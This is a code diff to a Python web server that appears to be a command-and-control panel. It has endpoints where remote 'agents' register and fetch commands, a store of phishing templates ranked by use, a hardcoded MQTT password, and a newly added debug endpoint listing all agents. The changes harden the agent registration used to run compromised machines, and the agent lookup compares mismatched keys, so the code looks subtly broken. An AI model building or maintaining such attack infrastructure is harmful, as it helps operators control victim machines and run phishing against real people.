@@ -39,7 +39,7 @@ MQTT_PASSWORD = "Orbpass123"
 
 # ============ GLOBALS ============
 active_websockets = []
-agents = []
+agents = []  # ✅ Pastikan ini list
 last_activity = time.time()
 omega_log = open("omega.log", "a", buffering=1)
 
@@ -279,16 +279,25 @@ async def get_phishing():
     templates = conn.execute("SELECT * FROM phishing_templates ORDER BY used_count DESC").fetchall()
     return {"templates": [dict(t) for t in templates]}
 
+# ✅ FIXED: register_agent dengan validasi
 @app.post("/agent")
 async def register_agent(request: Request):
-    data = await request.json()
-    data['last_seen'] = datetime.now().strftime("%H:%M:%S")
-    existing = next((a for a in agents if a['agent_id'] == data['id']), None)
-    if existing:
-        existing.update(data)
-    else:
-        agents.append(data)
-    return {"status": "registered"}
+    try:
+        data = await request.json()
+        if not data.get("id"):
+            return {"status": "error", "reason": "missing_id"}
+        
+        data['last_seen'] = datetime.now().strftime("%H:%M:%S")
+        existing = next((a for a in agents if a['agent_id'] == data['id']), None)
+        if existing:
+            existing.update(data)
+        else:
+            agents.append(data)
+        print(f"✅ Agent {data['id']} terdaftar")
+        return {"status": "registered"}
+    except Exception as e:
+        print(f"❌ Error register: {e}")
+        return {"status": "error", "detail": str(e)}
 
 @app.get("/agent/commands")
 async def get_commands(request: Request):
@@ -338,3 +347,13 @@ async def websocket_endpoint(websocket: WebSocket):
 @app.get("/health")
 async def health():
     return {"status": "ok", "agents": len(agents)}
+
+# ✅ DEBUG: Cek status
+@app.get("/debug")
+async def debug():
+    return {
+        "agents": agents,
+        "count": len(agents),
+        "websockets": len(active_websockets),
+        "time": datetime.now().isoformat()
+    }
